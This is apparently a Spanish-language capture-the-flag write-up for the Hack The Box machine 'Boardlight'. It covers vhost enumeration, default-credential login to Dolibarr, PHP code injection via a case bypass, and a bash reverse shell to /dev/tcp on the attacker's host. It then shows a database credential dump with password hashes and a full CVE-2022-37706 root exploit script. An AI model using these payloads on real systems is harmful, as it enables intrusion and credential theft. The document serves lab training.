
# Boardlight

<figure><img src="/files/EF2YJSwS6nP5mvSQojxK" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Primer acceso</mark>

Añadimos la IP `10.10.11.11` a nuestro `/etc/hosts` y accedemos través del navegador.

```bash
sudo echo "10.10.11.11 board.htb" | sudo tee -a /etc/hosts
```

<figure><img src="/files/GiV22TR8UH668FEdpz4I" alt=""><figcaption></figcaption></figure>

Parece una web de servicios de ciberseguridad. Nos encontramos un formulario de contacto pero que tampoco envía nada ni encontramos nada relevante en la petición que podamos explotar:

<figure><img src="/files/VdClxBcjnE8ZbsMJNJq4" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Escaneo de puertos</mark>

```bash
sudo nmap -v -sV -sCV -T5 10.10.11.11
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Solo encontramos 2 puertos abiertos, el 22 y el 80, los típicos.

## <mark style="color:purple;">Fuzzing</mark>

Haciendo fuzzing con dirsearch o gobuster no encontramos nada relevante.

## <mark style="color:purple;">Enumeración de Vhosts</mark>

En este momento puede parecer que no podemos hacer nada, pero vamos a usar ffuf para enumerar subdominios dentro de este host:

```bash
ffuf -u http://board.htb -H "Host:FUZZ.board.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -fw 12

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://board.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.board.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 12
________________________________________________

web                     [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 64ms]
m                       [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 65ms]
mail1                   [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 65ms]
gw                      [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 66ms]
dev                     [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 87ms]
secure                  [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 86ms]
mail2                   [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 90ms]
ww1                     [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 90ms]
ww42                    [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 87ms]
owa                     [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 90ms]
server                  [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 90ms]
webmail                 [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 90ms]
crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 98ms]
```

Observamos que hay un subdominio `crm` con un tamaño de respuesta diferente al resto, por lo que seguramente sea válido. Vamos a añadirlo a `/etc/hosts` y a ver su contenido:

<figure><img src="/files/bjgAe2KvwXBpZC13AFXi" alt=""><figcaption></figcaption></figure>

Llegamos a un login del ERP/CRM Dolibarr y encontramos una versión, lo que nos permitiría buscar exploits específicos.

Buscando en Google credenciales por defecto, encontramos que podemos acceder con el usuario admin y contraseña admin:

<figure><img src="/files/XJkAEnM8njOtLOqpg9I2" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/XBHdaxHJQzDieRMphexF" alt=""><figcaption></figcaption></figure>

Funciono! Conseguimos acceder al Dashboard.

## <mark style="color:purple;">Búsqueda de exploits</mark>

Haciendo un poco de research nos encontramos este POC en Github que nos podría servir para explotar manualmente un reverse shell:

{% embed url="<https://github.com/dollarboysushil/Dolibarr-17.0.0-Exploit-CVE-2023-30253>" %}

Vamos a seguir este POc en la parte de explotación.

## <mark style="color:purple;">Explotación</mark>

Una vez logueados como `admin:admin`, vamos a ir al apartado `Websites > Crear nuevo`

<figure><img src="/files/wP04Tnw4kPNt7JqkOtxC" alt=""><figcaption></figcaption></figure>

Una vez creado un website, vamos a crear una página de test:

<figure><img src="/files/Gg5f4YmRyg8RWgHnMK0T" alt=""><figcaption></figcaption></figure>

Una vez creada la página tenemos que:

1. Editar el HTML para añadir código en php
2. Previsualizar la página

<figure><img src="/files/Rd0PP1z5mVuYxrVCaK9q" alt=""><figcaption></figcaption></figure>

La web usa algún tipo de validación que no permite introducir código PHP. Vamos a hacer un simple bypass de esto poniendo la H de php en mayúsculas:

```php
<?pHp echo 2+2;?>
```

<figure><img src="/files/eV9rs7ON5Syg2sRaZ38g" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/PEiGD10EAwZkKSZ2o8X0" alt=""><figcaption></figcaption></figure>

Vemos que funciona y se pinta 2+2 en la página. Una vez que vemos que funciona vamos a crear una reverse shell en PHP y abrir un listener con Netcat:

```php
<?pHp exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.14.139/1010 0>&1'"); ?>
```

<figure><img src="/files/dpJIwImaMaa61vgvP5aF" alt=""><figcaption></figcaption></figure>

Abrimos la página y tenemos una shell! Somos el usuario www-data y vemos que hay un usuario larissa

<figure><img src="/files/y3ZEMbxEc89pEvggBpZH" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Enumeración y Credential Hunting</mark>

Buscamos archivos de configuración:

```shell-session
www-data@boardlight:/$ find / -type f -name "conf*.php" -exec ls -l {} \; 2>/dev/null
find / -type f -name "conf*.php" -exec ls -l {} \; 2>/dev/null
-rw-r--r-- 1 www-data www-data 2326 Mar  4  2023 /var/www/html/crm.board.htb/htdocs/stripe/config.php
-rw-r--r-- 1 www-data www-data 9173 Mar  4  2023 /var/www/html/crm.board.htb/htdocs/core/filemanagerdol/connectors/php/config.inc.php
-rw-r--r-- 1 www-data www-data 45084 Mar  4  2023 /var/www/html/crm.board.htb/htdocs/core/class/conf.class.php
-rw-r--r-- 1 www-data www-data 1736 May 17 00:18 /var/www/html/crm.board.htb/htdocs/conf/conf.php
-rw-r--r-- 1 www-data www-data 28120 Mar  4  2023 /var/www/html/crm.board.htb/htdocs/eventorganization/conferenceorboothattendee_card.php
-rw-r--r-- 1 www-data www-data 9665 Mar  4  2023 /var/www/html/crm.board.htb/htdocs/eventorganization/conferenceorboothattendee_note.php
-rw-r--r-- 1 www-data www-data 19981 Mar  4  2023 /var/www/html/crm.board.htb/htdocs/eventorganization/conferenceorbooth_contact.php
-rw-r--r-- 1 www-data www-data 27265 Mar  4  2023 /var/www/html/crm.board.htb/htdocs/eventorganization/conferenceorbooth_card.php
-rw-r--r-- 1 www-data www-data 45722 Mar  4  2023 /var/www/html/crm.board.htb/htdocs/eventorganization/conferenceorbooth_list.php
-rw-r--r-- 1 www-data www-data 30557 Mar  4  2023 /var/www/html/crm.board.htb/htdocs/eventorganization/class/conferenceorbooth.class.php
-rw-r--r-- 1 www-data www-data 42124 Mar  4  2023 /var/www/html/crm.board.htb/htdocs/eventorganization/class/conferenceorboothattendee.class.php
-rw-r--r-- 1 www-data www-data 18051 Mar  4  2023 /var/www/html/crm.board.htb/htdocs/eventorganization/conferenceorbooth_document.php
-rw-r--r-- 1 www-data www-data 43314 Mar  4  2023 /var/www/html/crm.board.htb/htdocs/eventorganization/conferenceorboothattendee_list.php
```

Encontramos uno que contiene credenciales de la base de datos:

```shell-session
www-data@boardlight:/$ cat /var/www/html/crm.board.htb/htdocs/conf/conf.php
cat /var/www/html/crm.board.htb/htdocs/conf/conf.php
<?php
//
// File generated by Dolibarr installer 17.0.0 on May 13, 2024
//
// Take a look at conf.php.example file for an example of conf.php file
// and explanations for all possibles parameters.
//
$dolibarr_main_url_root='http://crm.board.htb';
$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
$dolibarr_main_url_root_alt='/custom';
$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
$dolibarr_main_db_collation='utf8_unicode_ci';
// Authentication settings
$dolibarr_main_authentication='dolibarr';
```

## Conexión a la base de datos

```shell-session
www-data@boardlight:/$ mysql -u dolibarrowner -p -h localhost dolibarr
mysql -u dolibarrowner -p -h localhost dolibarr
Enter password: serverfun2$2023!!

Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 568
Server version: 8.0.36-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2024, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

## Enumeración de la base de datos

```sql
mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| dolibarr           |
| information_schema |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

mysql> use dolibarr
use dolibarr
Database changed
mysql> show tables;
show tables;
+-------------------------------------------------------------+
| Tables_in_dolibarr                                          |
+-------------------------------------------------------------+
| llx_accounting_account                                      |
| llx_accounting_bookkeeping                                  |
| llx_accounting_bookkeeping_tmp                              |
| llx_accounting_fiscalyear                                   |
| llx_accounting_groups_account                               |
| llx_accounting_journal                                      |
| llx_accounting_system                                       |
| llx_actioncomm                                              |
| llx_actioncomm_extrafields                                  |
| llx_actioncomm_reminder                                     |
| llx_actioncomm_resources                                    |
| llx_adherent                                                |
| llx_adherent_extrafields                                    |
| llx_adherent_type                                           |
| llx_adherent_type_extrafields                               |
| llx_adherent_type_lang                                      |
| llx_bank                                                    |
| llx_bank_account                                            |
| llx_bank_account_extrafields                                |
| llx_bank_categ                                              |
<----------------------------SNIP----------------------------->
| llx_user                                                    |
+-------------------------------------------------------------+
307 rows in set (0.00 sec)
```

Nos interesa la tabla users:

```sql
mysql> SELECT * FROM llx_user;
SELECT * FROM llx_user;
+-------+--------+--------------+---------+-------+----------+------------------+---------------------+---------------------+---------------+---------------+----------+---------------+------+--------------------------------------------------------------+-----------+--------------+--------+----------+------------+-----------+---------+------+------+----------+------------+-------+-------------+------+--------------+------------+-------------+-----------------+-------+----------------+-----------+----------------+--------+--------------+-----------+---------+---------------------------+---------------------------+---------+---------+---------+-------------+--------------+-----------+---------------------+---------------------+------------------------+-------------------+-----------------+--------------+-----------------+---------------+----------+--------+--------+-------+------+-------+---------+-----------------+------------------+------------+------+------+--------+-------------+----------------+-------------------+-------------+------------+---------------+-----------------------+------------------------------+--------------+
| rowid | entity | ref_employee | ref_ext | admin | employee | fk_establishment | datec               | tms                 | fk_user_creat | fk_user_modif | login    | pass_encoding | pass | pass_crypted                                                 | pass_temp | api_key      | gender | civility | lastname   | firstname | address | zip  | town | fk_state | fk_country | birth | birth_place | job  | office_phone | office_fax | user_mobile | personal_mobile | email | personal_email | signature | socialnetworks | fk_soc | fk_socpeople | fk_member | fk_user | fk_user_expense_validator | fk_user_holiday_validator | idpers1 | idpers2 | idpers3 | note_public | note_private | model_pdf | datelastlogin       | datepreviouslogin   | datelastpassvalidation | datestartvalidity | dateendvalidity | iplastlogin  | ippreviouslogin | egroupware_id | ldap_sid | openid | statut | photo | lang | color | barcode | fk_barcode_type | accountancy_code | nb_holiday | thm  | tjm  | salary | salaryextra | dateemployment | dateemploymentend | weeklyhours | import_key | default_range | default_c_exp_tax_cat | national_registration_number | fk_warehouse |
+-------+--------+--------------+---------+-------+----------+------------------+---------------------+---------------------+---------------+---------------+----------+---------------+------+--------------------------------------------------------------+-----------+--------------+--------+----------+------------+-----------+---------+------+------+----------+------------+-------+-------------+------+--------------+------------+-------------+-----------------+-------+----------------+-----------+----------------+--------+--------------+-----------+---------+---------------------------+---------------------------+---------+---------+---------+-------------+--------------+-----------+---------------------+---------------------+------------------------+-------------------+-----------------+--------------+-----------------+---------------+----------+--------+--------+-------+------+-------+---------+-----------------+------------------+------------+------+------+--------+-------------+----------------+-------------------+-------------+------------+---------------+-----------------------+------------------------------+--------------+
|     1 |      0 |              | NULL    |     1 |        1 |                0 | 2024-05-13 13:21:56 | 2024-05-13 13:21:56 |          NULL |          NULL | dolibarr | NULL          | NULL | $2y$10$VevoimSke5Cd1/nX1Ql9Su6RstkTRe7UX1Or.cm8bZo56NjCMJzCm | NULL      | NULL         |        |          | SuperAdmin |           |         |      |      |     NULL |       NULL | NULL  | NULL        |      |              |            |             |                 |       |                |           | null           |   NULL |         NULL |      NULL |    NULL |                      NULL |                      NULL | NULL    | NULL    | NULL    |             |              | NULL      | 2024-05-15 09:57:04 | 2024-05-13 23:23:59 | NULL                   | NULL              | NULL            | 10.10.14.31  | 10.10.14.41     |          NULL |          | NULL   |      1 | NULL  | NULL |       | NULL    |               0 |                  |          0 | NULL | NULL |   NULL |        NULL | NULL           | NULL              |        NULL | NULL       |          NULL |                  NULL |                              |         NULL |
|     2 |      1 |              | NULL    |     0 |        1 |                0 | 2024-05-13 13:24:01 | 2024-05-15 09:58:40 |          NULL |          NULL | admin    | NULL          | NULL | $2y$10$gIEKOl7VZnr5KLbBDzGbL.YuJxwz5Sdl5ji3SEuiUSlULgAhhjH96 | NULL      | yr6V3pXd9QEI | NULL   |          | admin      |           |         |      |      |     NULL |       NULL | NULL  | NULL        |      |              |            |             |                 |       |                |           | []             |   NULL |         NULL |      NULL |    NULL |                      NULL |                      NULL | NULL    | NULL    | NULL    |             |              | NULL      | 2024-08-13 04:27:26 | 2024-08-13 04:19:30 | NULL                   | NULL              | NULL            | 10.10.14.122 | 10.10.14.139    |          NULL |          | NULL   |      1 | NULL  | NULL |       | NULL    |               0 |                  |          0 | NULL | NULL |   NULL |        NULL | NULL           | NULL              |        NULL | NULL       |          NULL |                  NULL |                              |         NULL |
+-------+--------+--------------+---------+-------+----------+------------------+---------------------+---------------------+---------------+---------------+----------+---------------+------+--------------------------------------------------------------+-----------+--------------+--------+----------+------------+-----------+---------+------+------+----------+------------+-------+-------------+------+--------------+------------+-------------+-----------------+-------+----------------+-----------+----------------+--------+--------------+-----------+---------+---------------------------+---------------------------+---------+---------+---------+-------------+--------------+-----------+---------------------+---------------------+------------------------+-------------------+-----------------+--------------+-----------------+---------------+----------+--------+--------+-------+------+-------+---------+-----------------+------------------+------------+------+------+--------+-------------+----------------+-------------------+-------------+------------+---------------+-----------------------+------------------------------+--------------+
2 rows in set (0.00 sec)
```

Encontramos 2 passwords encriptados:

```
dolibarr:    $2y$10$VevoimSke5Cd1/nX1Ql9Su6RstkTRe7UX1Or.cm8bZo56NjCMJzCm
admin:       $2y$10$gIEKOl7VZnr5KLbBDzGbL.YuJxwz5Sdl5ji3SEuiUSlULgAhhjH96
```

Podríamos probar a crackearlos, pero antes vamos a probar las credenciales que descubrimos antes.

## <mark style="color:purple;">User flag</mark>

Vamos a probar a conectarnos por SSH como el usuario `larissa` (que como ya vimos es el único usuario del sistema) y la contraseña que encontramos antes:

```
ssh larissa@10.10.11.11

larissa@10.10.11.11's password: serverfun2$2023!!
```

<figure><img src="/files/RG6KY9aTNOxCuPdBrCqz" alt=""><figcaption></figcaption></figure>

Ya tenemos la user flag! 🏆

## <mark style="color:purple;">Escalada de privilegios</mark>

El usuario larissa no puede ejecutar sudo -l para ver los permisos de ejecución, por lo que vamos a buscar archivos con el SUID activo:

```bash
find / -perm -4000 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
/usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/sbin/pppd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/sudo
/usr/bin/su
/usr/bin/chfn
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/vmware-user-suid-wrapper
```

Encontramos uno que nos llama la atención: `enlightenment`. Si buscamos en Google enlightenment privilege escalation encontramos un script que nos puede servir:

{% embed url="<https://www.exploit-db.com/exploits/51180>" %}

Vamos a editar un poco este exploit para elevar nuestros privilegios rápidamente:

{% code title="exploit.sh" %}

```bash
#!/bin/bash

echo "CVE-2022-37706"
echo "[*] Trying to find the vulnerable SUID file..."
echo "[*] This may take few seconds..."

file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
if [[ -z ${file} ]]
then
	echo "[-] Couldn't find the vulnerable SUID file..."
	echo "[*] Enlightenment should be installed on your system."
	exit 1
fi

echo "[+] Vulnerable SUID binary found!"
echo "[+] Trying to pop a root shell!"
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"

echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit
echo "[+] Enjoy the root shell :)"
${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
```

{% endcode %}

<figure><img src="/files/0l549jwRXvjp7zGLBueq" alt=""><figcaption></figcaption></figure>

El script funciona y obtenemos una shell de root, obteniendo la Root Flag sin problema 😎
